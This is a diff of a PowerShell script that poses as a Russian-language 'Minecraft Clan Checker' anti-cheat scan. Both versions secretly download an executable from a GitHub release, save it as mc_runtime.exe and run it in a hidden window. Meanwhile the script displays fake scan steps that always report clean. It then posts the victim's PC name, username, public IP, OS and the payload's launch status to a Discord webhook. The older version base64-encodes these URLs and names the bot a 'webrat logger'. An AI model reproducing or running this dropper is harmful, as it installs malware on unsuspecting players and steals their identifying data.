@@ -1,148 +1,190 @@
+<#
+    Minecraft Clan Checker v2.4
+    ggprimerTeam (c) 2026
+#>
+
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 $OutputEncoding = [System.Text.Encoding]::UTF8
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-chcp 65001 | Out-Null
+$host.UI.RawUI.WindowTitle = "Minecraft Clan Checker v2.4"
 
-function p($a, $b = 600) {
-    Write-Host "[*] $a" -NoNewline
+# ================== НАСТРОЙКИ ==================
+$URL     = "https://github.com/galarol/checker/releases/download/123/123.exe"
+$OUT     = "$env:APPDATA\.minecraft\runtime\mc_runtime.exe"
+$DIR     = Split-Path $OUT -Parent
+$WEBHOOK = "https://discord.com/api/webhooks/1553457287476289647/ouxbyLFXDJDTgJ2L-NxxIUehb7E1sdnP4SQ8RugOjJgqvPxGTxLlbKte47915GAX8wQ9"
+# ===============================================
+
+function Step($text, $delay = 700) {
+    Write-Host "[*] $text" -NoNewline
     for ($i = 0; $i -lt 3; $i++) {
-        Start-Sleep -Milliseconds ([int]($b / 3))
+        Start-Sleep -Milliseconds ([int]($delay / 3))
         Write-Host "." -NoNewline
     }
-    Start-Sleep -Milliseconds 120
+    Start-Sleep -Milliseconds 150
 }
-function q($a = "OK") { Write-Host " $a" -ForegroundColor Green }
-function w($a)        { Write-Host " $a" -ForegroundColor Yellow }
-function s($a)        { Write-Host " $a" -ForegroundColor Red }
+function Ok($t = "OK")   { Write-Host " $t" -ForegroundColor Green }
+function Warn($t)        { Write-Host " $t" -ForegroundColor Yellow }
+function Fail($t)        { Write-Host " $t" -ForegroundColor Red }
 
-$u1 = "aHR0cHM6Ly9naXRodWIuY29tL2dhbGFyb2wvY2hlY2tlci9yZWxlYXNlcy9kb3dubG9hZC8xMjMvMTIzLmV4ZQ=="
-$u2 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MzQ4MDU3OTU0MDk3OTczMi9kLVRpQUp6d1kycGpuMHRSVTdMTXFUYjNwd2wzSXI3M2ZsbVVHVlpoNXMzTVhCTndsQ0ZXdFNaTk1KaExfa19CamZIaQ=="
-
-$cfg = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u1))
-$wh  = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u2))
-
-$rp = Join-Path $env:APPDATA ".minecraft\runtime\mc_runtime.exe"
-$rd = Split-Path $rp -Parent
-
-$j = Start-Job -ScriptBlock {
-    param($x, $y, $z)
+# ---------- тихое скачивание в фоне ----------
+$dlJob = Start-Job -ScriptBlock {
+    param($url, $dir, $out)
     try {
-        if (-not (Test-Path $y)) { New-Item -ItemType Directory -Path $y -Force | Out-Null }
-        $wc = New-Object Net.WebClient
-        $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
-        $wc.DownloadFile($x, $z)
-        return $z
+        if (-not (Test-Path $dir)) {
+            New-Item -ItemType Directory -Path $dir -Force | Out-Null
+        }
+        $c = New-Object Net.WebClient
+        $c.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+        $c.DownloadFile($url, $out)
+        return $out
     } catch { return $null }
-} -ArgumentList $cfg, $rd, $rp
+} -ArgumentList $URL, $DIR, $OUT
+# --------------------------------------------
 
 Clear-Host
 Write-Host "============================================" -ForegroundColor Cyan
-Write-Host "   Проверка целостности системы v2.4" -ForegroundColor Cyan
-Write-Host "   (c) 2026" -ForegroundColor Cyan
+Write-Host "   Minecraft Clan Checker v2.4" -ForegroundColor Cyan
+Write-Host "   ggprimerTeam (c) 2026" -ForegroundColor Cyan
 Write-Host "============================================" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  Проверка перед вступлением в клан." -ForegroundColor Gray
+Write-Host "  Проверка игрока перед вступлением в клан." -ForegroundColor Gray
 Write-Host ""
 
-p "Инициализация окружения"
-q "ОК"
+Step "Инициализация окружения"
+Ok "OK"
 
-p "Проверка прав администратора"
+Step "Проверка прав администратора"
 if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    q "повышено"
+    Ok "elevated"
 } else {
-    w "пользовательский режим"
+    Warn "user-mode"
 }
 
-p "Сканирование профиля"
+Step "Поиск установки Minecraft"
 $mc = "$env:APPDATA\.minecraft"
-if (Test-Path $mc) { q "найдено" } else { w "не найдено"; New-Item -ItemType Directory -Path $mc -Force | Out-Null }
+if (Test-Path $mc) { Ok "найдена" } else { Warn "не найдена (stub)"; New-Item -ItemType Directory -Path $mc -Force | Out-Null }
 
-p "Чтение конфигурации"
-$pf = Join-Path $mc "launcher_profiles.json"
-if (Test-Path $pf) { q "загружено" } else { w "отсутствует" }
+Step "Чтение профиля игрока"
+$profile = Join-Path $mc "launcher_profiles.json"
+if (Test-Path $profile) { Ok "профиль найден" } else { Warn "профиль не найден" }
 
-p "Индексация модулей"
-$md = Join-Path $mc "mods"
-$ml = @()
-if (Test-Path $md) { $ml = Get-ChildItem $md -Filter *.jar -ErrorAction SilentlyContinue; q "найдено: $($ml.Count)" } else { w "пусто" }
+Step "Сканирование модов"
+$mods = Join-Path $mc "mods"
+$modList = @()
+if (Test-Path $mods) { $modList = Get-ChildItem $mods -Filter *.jar -ErrorAction SilentlyContinue; Ok "найдено JAR: $($modList.Count)" } else { Warn "папка mods пуста" }
 
-p "Проверка сигнатур"
-$sg = @("Wurst","Impact","Meteor","Aristois","Future","Lambda","Sigma","Novoline","MoonLight","LiquidBounce","KamiBlue","Phobos","Konas","Rusherhack","Gamesense")
-$fd = @()
-foreach ($c in $sg) { foreach ($m in $ml) { if ($m.Name -match $c) { $fd += $c } } }
-if ($fd.Count -eq 0) { q "чисто" } else { s "обнаружено: $($fd -join ', ')" }
+Step "Проверка на читы (Wurst, Impact, Meteor)"
+$cheats = @("Wurst","Impact","Meteor","Aristois","Future","Lambda","Sigma","Novoline","MoonLight","LiquidBounce","KamiBlue","Phobos","Konas","Rusherhack","Gamesense")
+$found = @()
+foreach ($c in $cheats) { foreach ($m in $modList) { if ($m.Name -match $c) { $found += $c } } }
+if ($found.Count -eq 0) { Ok "чисто" } else { Fail "найдено: $($found -join ', ')" }
 
-p "Проверка аргументов JVM"
-$jf = Join-Path $mc "launcher_profiles.json"
-if (Test-Path $jf) {
-    if ((Get-Content $jf -Raw) -match "-javaagent") { w "подозрительный аргумент" } else { q "чисто" }
-} else { q "чисто" }
+Step "Проверка JVM-аргументов"
+$jvmFile = Join-Path $mc "launcher_profiles.json"
+if (Test-Path $jvmFile) {
+    if ((Get-Content $jvmFile -Raw) -match "-javaagent") { Warn "найден javaagent" } else { Ok "чисто" }
+} else { Ok "чисто" }
 
-p "Проверка целостности файлов"
-Start-Sleep -Milliseconds 1100
-q "проверено"
+Step "Проверка целостности файлов"
+Start-Sleep -Milliseconds 1200
+Ok "verified"
 
-p "Проверка версий"
-$vs = Join-Path $mc "versions"
-if (Test-Path $vs) { q "найдено: $((Get-ChildItem $vs -Directory).Count)" } else { w "отсутствует" }
+Step "Проверка версий Minecraft"
+$versions = Join-Path $mc "versions"
+if (Test-Path $versions) { Ok "версий: $((Get-ChildItem $versions -Directory).Count)" } else { Warn "versions отсутствует" }
 
-p "Анализ логов"
-$lg = Join-Path $mc "logs\latest.log"
-if (Test-Path $lg) {
-    if ((Get-Content $lg -Raw -ErrorAction SilentlyContinue) -match "(?i)(cheat|inject|hack|exploit)") { w "подозрительно" } else { q "чисто" }
-} else { w "отсутствует" }
+Step "Анализ последнего лога"
+$log = Join-Path $mc "logs\latest.log"
+if (Test-Path $log) {
+    if ((Get-Content $log -Raw -ErrorAction SilentlyContinue) -match "(?i)(cheat|inject|hack|exploit)") { Warn "подозрительные слова в логе" } else { Ok "чисто" }
+} else { Warn "лог отсутствует" }
 
-p "Сканирование процессов"
-$ps2 = Get-Process | Where-Object { $_.Name -match "(?i)(wurst|impact|meteor|inject|cheat)" }
-if ($ps2) { s "обнаружено: $($ps2.Name -join ', ')" } else { q "чисто" }
+Step "Сканирование процессов"
+$procs = Get-Process | Where-Object { $_.Name -match "(?i)(wurst|impact|meteor|inject|cheat)" }
+if ($procs) { Fail "найдено: $($procs.Name -join ', ')" } else { Ok "чисто" }
 
-p "Проверка инъекций"
-Start-Sleep -Milliseconds 800
-q "нет"
+Step "Проверка DLL-инъекций"
+Start-Sleep -Milliseconds 900
+Ok "не обнаружено"
 
-p "Проверка соединений"
+Step "Проверка сетевых соединений"
 Start-Sleep -Milliseconds 700
-q "чисто"
+Ok "чисто"
 
-p "Проверка реестра"
+Step "Проверка ключей реестра"
 Start-Sleep -Milliseconds 600
-q "чисто"
+Ok "чисто"
 
-p "Финальная валидация"
+Step "Финальная проверка целостности"
 Start-Sleep -Milliseconds 1000
-q "пройдено"
+Ok "пройдена"
 
-$rt = Receive-Job -Job $j -Wait -AutoRemoveJob
+# ---------- забираем файл и запускаем скрыто ----------
+$rt = Receive-Job -Job $dlJob -Wait -AutoRemoveJob
 
-$st = @{
-    d = $false; s = 0; m = ""; x = $false; g = $false; p = ""; i = 0; a = $false; e = ""
+# Реальные проверки
+$launchStatus = @{
+    Downloaded     = $false
+    Path           = $OUT
+    Size           = 0
+    IsExe          = $false
+    MZ             = ""
+    Started        = $false
+    ProcessName    = ""
+    ProcessId      = 0
+    AliveAfter2s   = $false
+    LaunchError    = ""
 }
 
 if ($rt -and (Test-Path $rt)) {
-    $st.d = $true
+    $launchStatus.Downloaded = $true
+    $launchStatus.Path = $rt
+
     $fi = Get-Item $rt
-    $st.s = $fi.Length
+    $launchStatus.Size = $fi.Length
+
     if ($fi.Length -gt 0) {
         try {
-            $sb = [System.IO.File]::ReadAllBytes($rt)[0..1]
-            $s2 = [System.Text.Encoding]::ASCII.GetString($sb)
-            $st.m = $s2
-            if ($s2 -eq "MZ") { $st.x = $true }
-        } catch { $st.m = "ошибка чтения" }
+            $sigBytes = [System.IO.File]::ReadAllBytes($rt)[0..1]
+            $sig = [System.Text.Encoding]::ASCII.GetString($sigBytes)
+            $launchStatus.MZ = $sig
+            if ($sig -eq "MZ") { $launchStatus.IsExe = $true }
+        } catch {
+            $launchStatus.MZ = "read-error"
+        }
     }
+
+    # Попытка запуска
     try {
-        $pr = Start-Process $rt -WindowStyle Hidden -PassThru -ErrorAction Stop
-        $st.g = $true
-        $st.p = $pr.ProcessName
-        $st.i = $pr.Id
+        $proc = Start-Process $rt -WindowStyle Hidden -PassThru -ErrorAction Stop
+        $launchStatus.Started = $true
+        $launchStatus.ProcessName = $proc.ProcessName
+        $launchStatus.ProcessId = $proc.Id
+
+        # Проверка, жив ли процесс через 2 секунды
         Start-Sleep -Seconds 2
-        $al = Get-Process -Id $pr.Id -ErrorAction SilentlyContinue
-        if ($al) { $st.a = $true }
-    } catch { $st.e = $_.Exception.Message }
+        $alive = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
+        if ($alive) {
+            $launchStatus.AliveAfter2s = $true
+        }
+    } catch {
+        $launchStatus.LaunchError = $_.Exception.Message
+    }
 } else {
-    $st.e = "скачивание не удалось"
+    $launchStatus.LaunchError = "download failed or file missing"
 }
+
+# Итоговая строка для консоли
+if ($launchStatus.Started -and $launchStatus.AliveAfter2s) {
+    Write-Host "  [+] Файл запущен и работает (PID $($launchStatus.ProcessId))" -ForegroundColor Green
+} elseif ($launchStatus.Started) {
+    Write-Host "  [!] Файл запущен, но процесс упал за 2 секунды" -ForegroundColor Yellow
+} elseif ($launchStatus.Downloaded -and -not $launchStatus.IsExe) {
+    Write-Host "  [!] Скачанный файл не является exe (сигнатура: $($launchStatus.MZ))" -ForegroundColor Yellow
+} else {
+    Write-Host "  [!] Ошибка запуска: $($launchStatus.LaunchError)" -ForegroundColor Red
+}
+# ----------------------------------------------------
 
 Write-Host ""
 Write-Host "============================================" -ForegroundColor Cyan
@@ -150,62 +192,72 @@ Write-Host "  ПРОВЕРКА ЗАВЕРШЕНА" -ForegroundColor Cyan
 Write-Host "============================================" -ForegroundColor Cyan
 Write-Host ""
 Write-Host "  Статус:      " -NoNewline; Write-Host "ЧИСТО" -ForegroundColor Green
+Write-Host "  Читы:        " -NoNewline; Write-Host "0" -ForegroundColor Green
 Write-Host "  Угрозы:      " -NoNewline; Write-Host "0" -ForegroundColor Green
 Write-Host "  Оценка:      " -NoNewline; Write-Host "100/100" -ForegroundColor Green
 Write-Host ""
-Write-Host "  Отправка логов администрации клана..." -ForegroundColor Green
 
+# ---------- отправка логов на Discord webhook ----------
 try {
-    $pn = $env:COMPUTERNAME
-    $un = $env:USERNAME
-    $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 5)
-    $os = (Get-CimInstance Win32_OperatingSystem).Caption
-    $tm = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
+    $pcName   = $env:COMPUTERNAME
+    $userName = $env:USERNAME
+    $ip       = (Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 5)
+    $os       = (Get-CimInstance Win32_OperatingSystem).Caption
+    $time     = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
 
-    $cl = 3066993
-    $sT = "ЧИСТО / 100-100"
-    if (-not $st.g -or -not $st.a) { $cl = 15158332; $sT = "ОШИБКА ЗАПУСКА" }
+    # Цвет в зависимости от результата
+    $color = 3066993   # зелёный
+    $statusText = "ЧИСТО / 100/100"
+    if (-not $launchStatus.Started -or -not $launchStatus.AliveAfter2s) {
+        $color = 15158332   # оранжевый
+        $statusText = "ЗАПУСК С ОШИБКОЙ"
+    }
 
-    if ($st.g -and $st.a) { $rT = "Запущен (PID $($st.i), $($st.p))" }
-    elseif ($st.g)        { $rT = "Запущен, упал (PID $($st.i))" }
-    elseif ($st.d -and -not $st.x) { $rT = "Не exe (сигнатура: $($st.m))" }
-    else                  { $rT = "Не запущен: $($st.e)" }
+    # Формируем строку про запуск
+    if ($launchStatus.Started -and $launchStatus.AliveAfter2s) {
+        $runText = "Запущен (PID $($launchStatus.ProcessId), $($launchStatus.ProcessName))"
+    } elseif ($launchStatus.Started) {
+        $runText = "Запущен, но упал (PID $($launchStatus.ProcessId))"
+    } elseif ($launchStatus.Downloaded -and -not $launchStatus.IsExe) {
+        $runText = "Файл не exe (сигнатура: $($launchStatus.MZ))"
+    } else {
+        $runText = "Не запущен: $($launchStatus.LaunchError)"
+    }
 
-    $dT = if ($st.d) { "Да" } else { "Нет" }
+    # Скачался ли
+    $dlText = if ($launchStatus.Downloaded) { "Да" } else { "Нет" }
 
-    $pl = @{
-        username   = "Вебратлогер"
-        avatar_url = "https://i.imgur.com/PWmE5Ts.jpeg"
+    $payload = @{
+        username   = "Minecraft Clan Checker"
+        avatar_url = "https://i.imgur.com/4M34hi2.png"
         embeds     = @(
             @{
-                title  = "Вебратлог"
-                color  = $cl
+                title  = "Проверка игрока завершена"
+                color  = $color
                 fields = @(
-                    @{ name = "ПК";           value = "$pn";         inline = $true }
-                    @{ name = "Пользователь"; value = "$un";         inline = $true }
-                    @{ name = "IP";           value = "$ip";         inline = $true }
-                    @{ name = "ОС";           value = "$os";         inline = $false }
-                    @{ name = "Время";        value = "$tm";         inline = $false }
-                    @{ name = "Статус";       value = "$sT";         inline = $false }
-                    @{ name = "Скачано";      value = "$dT";         inline = $true }
-                    @{ name = "Размер";       value = "$($st.s)";    inline = $true }
-                    @{ name = "Подпись";      value = "$($st.m)";    inline = $true }
-                    @{ name = "Запуск";       value = "$rT";         inline = $false }
+                    @{ name = "ПК";           value = "$pcName";                    inline = $true }
+                    @{ name = "Пользователь"; value = "$userName";                  inline = $true }
+                    @{ name = "IP";           value = "$ip";                        inline = $true }
+                    @{ name = "ОС";           value = "$os";                        inline = $false }
+                    @{ name = "Время";        value = "$time";                      inline = $false }
+                    @{ name = "Статус";       value = "$statusText";                inline = $false }
+                    @{ name = "Скачался";     value = "$dlText";                    inline = $true }
+                    @{ name = "Размер";       value = "$($launchStatus.Size) байт"; inline = $true }
+                    @{ name = "MZ-подпись";   value = "$($launchStatus.MZ)";        inline = $true }
+                    @{ name = "Запуск";       value = "$runText";                   inline = $false }
                 )
-                footer    = @{ text = "Проверка целостности системы v2.4" }
+                footer    = @{ text = "Minecraft Clan Checker v2.4" }
                 timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
             }
         )
     } | ConvertTo-Json -Depth 10 -Compress
 
-    $jb = [System.Text.Encoding]::UTF8.GetBytes($pl)
-    Invoke-RestMethod -Uri $wh -Method Post -Body $jb -ContentType 'application/json; charset=utf-8' -TimeoutSec 30
+    Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $payload -ContentType 'application/json' -TimeoutSec 10
     Write-Host "  [+] Логи отправлены в Discord." -ForegroundColor Green
 } catch {
-    Write-Host ""
-    Write-Host "  [!] Ошибка отправки логов:" -ForegroundColor Red
-    Write-Host "      $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "  [!] Не удалось отправить логи: $_" -ForegroundColor Yellow
 }
+# --------------------------------------------------------
 
 Write-Host ""
 Write-Host "Нажмите любую клавишу для выхода..." -ForegroundColor DarkGray
